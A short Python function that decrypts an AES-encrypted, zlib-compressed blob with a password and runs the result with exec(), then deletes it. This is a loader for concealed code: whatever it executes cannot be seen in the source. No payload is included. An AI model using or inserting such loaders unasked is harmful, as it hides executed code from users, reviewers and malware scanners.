def run_decryption(data_b64, salt_b64, password):
    import base64, zlib
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Util.Padding import unpad
    from Crypto.Hash import SHA256

    try:
        salt = base64.b64decode(salt_b64)
        data = base64.b64decode(data_b64)

        key = PBKDF2(password, salt, dkLen=32, count=390000, hmac_hash_module=SHA256)
        iv = data[:16]
        ciphertext = data[16:]

        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
        code = zlib.decompress(decrypted).decode()

        exec(code)
        del code

    except Exception as e:
        print("فشل في فك التشفير أو التنفيذ:", e)
